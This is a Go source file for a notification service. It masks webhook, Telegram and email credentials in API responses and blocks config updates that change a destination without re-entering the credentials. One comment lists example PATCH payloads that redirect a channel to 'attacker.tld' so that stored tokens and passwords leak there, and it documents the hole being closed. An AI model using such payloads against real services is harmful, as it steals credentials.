package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of masked values. When the API echoes credentials it replaces the real content with a value carrying this prefix,
// and the update API interprets a value with this prefix as "keep the stored value unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so that a little identifying information can come along
// (see MaskedValue), letting users tell which robot this is without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short; no hint given
//	"__masked__:…ab12cd"      last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a webhook URL's identifying information is in its last segment (such as the WeCom key or
// the Feishu robot id), while the prefix is the same for every robot and has no identifying value. The last 6 characters are not enough to
// recover the credential, but enough for whoever configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed by the API and left unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel kind returns an empty map rather than the original config: better for the UI to show "config unavailable"
// than to dump raw content that may contain credentials when the channel kind is unrecognized.
// Non-credential fields are kept as is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole: deciding per sub-key would require every channel
		// to declare another set of "which sub-keys are credentials" rules, with complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did not state
// the credential fields". It is returned instead of silently allowing or silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") changed; re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: provide new values, or explicitly leave them empty if credentials are no longer needed. " +
		"The old credentials are only valid for the old destination; keeping them would hand them to the new destination."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive case of a destination change.
//
// It replaces a bare MergeConfig on the channel update path and closes a path verified to work in practice:
// the destination (where messages go) and the credentials (which identity sends them) are separate fields, and MergeConfig
// always keeps the stored value for keys not mentioned. So anyone able to PATCH a channel could, by **changing only the destination
// and saying nothing about the credentials**, make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not depend on redirects (so refusing cross-host redirects does not stop it),
// and it directly defeats the goal of this package's masking: "credentials are never echoed to the browser".
//
// Rule: whenever a destination key changes to a new value, the caller must explicitly state **every** credential key:
//   - a new value → use the new value
//   - an explicit empty string → the field no longer needs a credential (keeps the clearing semantics)
//   - the masked value echoed back / the key omitted entirely → rejected
//
// The third is rejected too because a masked value means exactly "keep the old credential", and the old credential
// is only valid for the old destination. This deliberately does not "drop the credential automatically": for optional credential fields
// (webhook headers, email password) that would silently become "authentication gone but the API returns 200",
// which is harder to troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook headers, which is an object) embeds a masked literal,
	// the caller has stuffed the "keep original" sentinel inside a structure. MergeConfig only recognizes "a string
	// with the prefix" as masked, so this shape would be stored as an ordinary object: the literal
	// "__masked__" would really land in the database, and later authentication would silently fail with no error at all. Better to reject it.
	//
	// This check must come **first**: when the destination is unchanged there is an early return, so placing it later would
	// cover only the "destination changed" path (the first version put it there by mistake, and the tests caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: do a normal merge (masked values keep the original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require an explicit statement for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masked sentinel inside a non-string structure.
//
// Masking assumes "the whole value is one string". Object fields like webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// can neither express "keep unchanged" nor avoid being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: leave the whole field empty to keep it, or submit a whole new value; a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. Comparing via JSON serialization also handles
// type differences: the frontend submits the port as a number while the stored value reads back as float64, so a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and a missing key are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is the only such field: empty means the
// official endpoint) would take this path:
//
//	created with base_url:""  →  first save deletes the key via MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "destination changed"
//	→ credentials are masked → 400 "destination changed; re-enter the credential fields"
//
// From then on every save fails unless the user re-pastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The rule must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise there is a gap where MergeConfig thinks it should be deleted but sameConfigValue thinks it has a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - keys in incoming with a masked value → keep stored's original (the user did not change this field)
//   - keys in incoming with an empty string → treated as an explicit clear; the key is deleted
//   - other keys → overwritten with incoming's value
//   - keys in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string means "clear" has to be explicit: the frontend form submits unfilled fields as empty strings,
// and writing that as a valid value would actually clear fields left empty to keep their original value.
// Explicit clearing is chosen here because when clearing a misconfigured field the user has no other way to express it
// (omitting the field could distinguish "not provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged; keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
